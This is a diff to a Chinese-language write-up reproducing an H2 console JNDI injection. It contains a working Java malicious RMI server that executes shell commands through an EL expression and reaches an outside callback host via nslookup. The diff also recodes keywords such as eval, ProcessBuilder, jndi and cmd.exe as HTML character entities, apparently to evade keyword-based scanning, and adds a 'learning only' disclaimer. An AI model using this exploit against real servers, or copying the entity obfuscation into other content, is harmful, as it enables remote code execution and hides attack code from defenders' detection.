@@ -35,13 +35,15 @@ spring.h2.console.settings.web-allow-others=true
 
 ```
 docker-compose up -d
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 启动后，访问 `http://your-ip:8080/h2-console/` 即可查看到 H2 database 的管理页面。
 
 ## 漏洞复现
 
-目标环境是 Java 8u252，版本较高，因为上下文是 Tomcat 环境，我们可以参考《[Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)》，使用 `org.apache.naming.factory.BeanFactory` 加 EL 表达式注入的方式来执行任意命令。
+目标环境是 Java 8u252，版本较高，因为上下文是 Tomcat 环境，我们可以参考《[Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-&#106;ndi-injections-java)》，使用 `org.apache.naming.factory.BeanFactory` 加 EL 表达式注入的方式来执行任意命令。
 
 ```java
 import java.rmi.registry.*;
@@ -58,14 +60,15 @@ public class EvilRMIServerNew {
         ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
         //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
         ref.add(new StringRefAddr("forceString", "x=eval"));
-        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
-        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','nslookup jndi.s.artsploit.com']).start()\")"));
+        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to &#99;md.exe if you target windows
+        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").&#101;val(\"new java.lang.&#80;rocessBuilder['(java.lang.String[])'](['/bin/sh','-c','nslookup jndi.s.artsploit.com']).start()\")"));
  
         ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
         registry.bind("Object", referenceWrapper);
     }
-}
-```
+}</code></pre>
+
+</details>
 
 我们可以借助这个小工具 [JNDI](https://github.com/JosephTribbianni/JNDI) 简化我们的复现过程。
 
